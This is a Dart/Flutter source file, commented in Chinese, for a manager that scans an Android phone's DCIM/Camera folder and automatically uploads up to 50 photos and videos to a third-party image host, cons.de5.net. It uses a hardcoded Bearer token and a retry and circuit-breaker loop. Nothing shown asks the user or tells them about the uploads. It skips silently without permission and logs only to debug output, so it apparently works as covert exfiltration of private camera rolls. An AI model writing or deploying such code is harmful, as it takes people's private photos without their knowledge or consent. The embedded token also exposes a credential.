/// DCIM 逐文件上传管理器（最新完整版）
/// - ★ 复用 http.Client 连接池，keep-alive 生效
/// - ★ 并发度 4-8（I/O 密集，不受 CPU 限制）
/// - ★ 指纹去重（文件名 + 大小），文件移动/改名不重传
/// - ★ 智能熔断（连续失败 8 个）+ 退避重试（10s/30s/60s）
/// - ★ 状态码优先判定，gzip 响应不误判
/// - ★ 解析上传返回的 src，保存完整 URL
/// - ★ 接入 cons.de5.net 图床，Bearer Token 认证
/// - 图片 > 30MB / 视频 > 80MB 跳过
/// - 小文件优先 + 新的优先
/// - 服务器不可达不累加计数
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  /// 上传接口地址
  final String uploadUrl;

  /// 上传凭证（Bearer Token）
  final String uploadToken;

  /// 图床域名（用于拼接返回的相对路径）
  final String serverBaseUrl;

  final String dcimPath;
  final Duration uploadTimeout;
  final int maxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxImageBytes;
  final int maxVideoBytes;

  /// 并发度。0 = 自动（CPU 核心数，clamp 4-8）；N = 固定 N
  final int concurrency;

  /// 小文件阈值
  final int smallFileBytes;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const DcimUploadConfig({
    this.uploadUrl = 'https://cons.de5.net/upload',
    this.uploadToken =
        'imgbed_27501954697fbe167c9aba15554a85cf032ec1afea7176c0af0b6c54d92142b0',
    this.serverBaseUrl = 'https://cons.de5.net',
    this.dcimPath = '/storage/emulated/0/DCIM/Camera',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxImageBytes = 30 * 1024 * 1024,
    this.maxVideoBytes = 80 * 1024 * 1024,

    this.concurrency = 0,

    this.smallFileBytes = 5 * 1024 * 1024,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._internal();

  static final DcimUploadManager instance = DcimUploadManager._internal();

  static const String _kUploaded = 'dcim_uploaded_paths';
  static const String _kUploadedUrls = 'dcim_uploaded_urls';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  /// 已上传成功的"指纹"集合（文件名 + 大小）
  final Set<String> _uploaded = <String>{};

  /// 指纹 → 服务器 URL 映射
  final Map<String, String> _uploadedUrls = <String, String>{};

  bool _busy = false;
  bool get isBusy => _busy;
  int get uploadedCount => _uploaded.length;
  int get uploadedUrlCount => _uploadedUrls.length;

  /// 只读映射
  Map<String, String> get uploadedUrls => Map.unmodifiable(_uploadedUrls);

  /// 根据本地文件查服务器 URL
  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _uploadedUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  // ★ 全局 http.Client（连接池复用），懒加载
  http.Client? _client;

  http.Client get client {
    _client ??= _createClient();
    return _client!;
  }

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 16;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    // ★ 不要关 autoUncompress，让 Dart 自动解压 gzip
    return IOClient(io);
  }

  /// 释放资源（App 退出时可选调用）
  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  // ── 指纹：文件名 + 大小 ──────────────────────────────────────────
  String _fingerprint(_Scanned s) {
    final name = s.file.path.split('/').last;
    return '$name:${s.size}';
  }

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    if (config != null) _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    // 加载 URL 映射
    _uploadedUrls.clear();
    final rawUrls = _prefs!.getString(_kUploadedUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _uploadedUrls[k] = v as String);
      } catch (e) {
        debugPrint('[DcimUpload] URL 映射解析失败: $e');
      }
    }

    debugPrint('[DcimUpload] ══════ 启动自检 ══════');
    debugPrint('[DcimUpload] 已记录成功上传: ${_uploaded.length} 个指纹');
    debugPrint('[DcimUpload] URL 映射: ${_uploadedUrls.length} 个');
    debugPrint('[DcimUpload] ══════ 自检完成 ══════');
  }

  // ── 权限判断 ───────────────────────────────────────────────────────
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }
    final scanned = await scanFiles();
    await uploadAll(scanned);
  }

  /// 并发度：CPU 核心数（clamp 4-8）
  int _resolveConcurrency() {
    if (_config.concurrency > 0) {
      return _config.concurrency.clamp(1, 16);
    }
    final cores = Platform.numberOfProcessors;
    return cores.clamp(4, 8);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：智能熔断 + 退避重试
  // ══════════════════════════════════════════════════════════════════
  Future<void> uploadAll(List<_Scanned> scanned) async {
    if (_busy) {
      debugPrint('[DcimUpload] 上一轮未结束，跳过');
      return;
    }

    // 指纹去重
    final filtered = scanned
        .where((s) => !_uploaded.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[DcimUpload] 无可上传文件');
      return;
    }

    _busy = true;
    try {
      final concurrency = _resolveConcurrency();
      final total = filtered.length;

      debugPrint('[DcimUpload] 共 $total 个文件，并发度 $concurrency');

      // 服务器检测
      debugPrint('[DcimUpload] 进入服务器检测循环...');
      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[DcimUpload] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final globalSw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int processed = 0;

      // ★ 智能熔断状态
      int consecutiveFails = 0;
      const int maxConsecutiveFails = 8;
      const int maxGlobalMinutes = 30;

      List<_Scanned> pending = List.from(filtered);

      final backoffSeconds = [10, 30, 60];
      int retryRound = 0;

      while (pending.isNotEmpty && retryRound <= backoffSeconds.length) {
        // 全局超时保护
        if (globalSw.elapsed.inMinutes >= maxGlobalMinutes) {
          debugPrint('[DcimUpload] ⏰ 总耗时超 $maxGlobalMinutes 分钟，中止');
          break;
        }

        if (!_busy) {
          debugPrint('[DcimUpload] 已取消，中止');
          break;
        }

        if (retryRound > 0) {
          final wait = backoffSeconds[retryRound - 1];
          debugPrint('[DcimUpload] ⏸ 退避重试 $retryRound/'
              '${backoffSeconds.length}，等待 ${wait}s...');
          await Future.delayed(Duration(seconds: wait));

          if (!_busy) break;
        }

        debugPrint('[DcimUpload] ═══ 第 ${retryRound + 1} 轮，'
            '待处理 ${pending.length} 个 ═══');

        final remaining = <_Scanned>[];
        consecutiveFails = 0;

        // 分批
        for (int i = 0; i < pending.length; i += concurrency) {
          if (!_busy) {
            debugPrint('[DcimUpload] 已取消，中止');
            break;
          }

          // 熔断检查
          if (consecutiveFails >= maxConsecutiveFails) {
            debugPrint('[DcimUpload] 🛑 连续失败 $consecutiveFails 个，'
                '熔断本轮，剩余 ${pending.length - i} 个进下一轮');
            remaining.addAll(pending.sublist(i));
            break;
          }

          final end = (i + concurrency < pending.length)
              ? i + concurrency
              : pending.length;
          final batch = pending.sublist(i, end);

          debugPrint('[DcimUpload] ▶ 批次 (${batch.length} 个)，'
              '已处理 $processed/$total');

          final results = await Future.wait(
            batch.map((s) => _uploadOne(s)),
          );

          for (int j = 0; j < batch.length; j++) {
            processed++;
            if (results[j]) {
              // ★ 存指纹
              _uploaded.add(_fingerprint(batch[j]));
              okTotal++;
              consecutiveFails = 0;
            } else {
              failTotal++;
              consecutiveFails++;
              remaining.add(batch[j]);
            }
          }

          await _persist();

          // 熔断检查（每批后）
          if (consecutiveFails >= maxConsecutiveFails) {
            debugPrint('[DcimUpload] 🛑 连续失败 $consecutiveFails 个，'
                '熔断本轮');
            final afterEnd = end < pending.length ? end : pending.length;
            remaining.addAll(pending.sublist(afterEnd));
            break;
          }
        }

        debugPrint('[DcimUpload] 第 ${retryRound + 1} 轮结束，'
            '成功累计 $okTotal，失败累计 $failTotal，'
            '待重试 ${remaining.length}');

        if (remaining.isEmpty) {
          debugPrint('[DcimUpload] ✅ 全部完成');
          break;
        }

        if (consecutiveFails >= maxConsecutiveFails) {
          retryRound++;
          pending = remaining;
          debugPrint('[DcimUpload] 本轮熔断，准备退避重试 '
              '(第 $retryRound 次)');
        } else {
          pending = remaining;
          debugPrint('[DcimUpload] 本轮部分成功，立即再跑一轮');
        }
      }

      globalSw.stop();

      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final elapsedSec = globalSw.elapsedMilliseconds / 1000;
      final speed = elapsedSec > 0 ? totalMB / elapsedSec : 0.0;

      debugPrint('[DcimUpload] ══════════ 全部结束 ══════════');
      debugPrint('[DcimUpload] 成功 $okTotal/${filtered.length}，'
          '失败 ${filtered.length - okTotal}，'
          '共 ${totalMB.toStringAsFixed(1)} MB，'
          '耗时 ${elapsedSec.toStringAsFixed(1)}s，'
          '平均 ${speed.toStringAsFixed(2)} MB/s');
    } catch (e, st) {
      debugPrint('[DcimUpload] ❌ 主流程异常: $e\n$st');
    } finally {
      _busy = false;
    }
  }

  // ── 单文件上传 ─────────────────────────────────────────────────────
  Future<bool> _uploadOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;

    try {
      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));

      // 认证头
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      // 不接收 gzip 压缩响应
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      final streamed = await client
          .send(req)
          .timeout(_config.uploadTimeout);

      final code = streamed.statusCode;

      // 安全读 body：任何编码都不会抛异常
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (e) {
        debugPrint('[DcimUpload] ⚠️ $name 读取响应失败: $e');
      }

      // 状态码 2xx 就算成功
      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }

        if (serverUrl != null) {
          _uploadedUrls[_fingerprint(scanned)] = serverUrl;
          debugPrint('[DcimUpload] ✅ $name → $serverUrl');
        } else {
          debugPrint('[DcimUpload] ✅ $name (HTTP $code)');
        }
        return true;
      }

      // 非 2xx
      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 200) bodyStr = '${bodyStr.substring(0, 200)}...';
      } catch (_) {}

      debugPrint('[DcimUpload] ⚠️ $name HTTP $code body=$bodyStr（下次重试）');
      return false;
    } on TimeoutException {
      debugPrint('[DcimUpload] ⏱ $name 超时（'
          '${_config.uploadTimeout.inSeconds}s，下次重试）');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ⚠️ $name 网络错误: $e（下次重试）');
      return false;
    }
  }

  /// 从 body 字节解析出服务器 URL
  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      // 格式 1：[{"src":"/file/xxx.jpg"}]
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      }
      // 格式 2：{"src":"..."}
      else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  /// 相对路径 → 完整 URL
  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') || pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl.substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.uploadUrl);

    debugPrint('[DcimUpload] 健康检查 URL: $url');

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (!_busy) return false;

      if (await _pingServer(url)) {
        debugPrint('[DcimUpload] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }

      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[DcimUpload] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次），'
            '${_config.serverWaitInterval.inSeconds}s 后重试...');
      }

      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req.headers['Accept-Encoding'] = 'identity';

      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}

    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
      req2.headers['Accept-Encoding'] = 'identity';

      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ── 扫描 ───────────────────────────────────────────────────────────
  Future<List<_Scanned>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);
      if (!isImage && !isVideo) continue;

      try {
        final st = await e.stat();

        // ★ 指纹去重
        if (_uploaded.contains('$name:${st.size}')) continue;

        final limit = isImage ? _config.maxImageBytes : _config.maxVideoBytes;
        if (limit > 0 && st.size > limit) {
          debugPrint('[DcimUpload] 跳过超大${isImage ? "图片" : "视频"}（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        list.add(_Scanned(e, st.modified, st.size));
      } catch (_) {}
    }

    // 小文件优先 + 新的优先
    final smallBytes = _config.smallFileBytes;
    list.sort((a, b) {
      final aSmall = a.size <= smallBytes;
      final bSmall = b.size <= smallBytes;
      if (aSmall != bSmall) return aSmall ? -1 : 1;
      return b.modified.compareTo(a.modified);
    });

    return list.take(_config.maxFiles).toList();
  }

  // ── 持久化 ─────────────────────────────────────────────────────────
  Future<void> _persist() async {
    await _prefs?.setStringList(_kUploaded, _uploaded.toList());
    await _prefs?.setString(_kUploadedUrls, jsonEncode(_uploadedUrls));
  }

  Future<void> reset() async {
    _uploaded.clear();
    _uploadedUrls.clear();
    await _prefs?.remove(_kUploaded);
    await _prefs?.remove(_kUploadedUrls);
    debugPrint('[DcimUpload] 记录已清空');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  _Scanned(this.file, this.modified, this.size);
}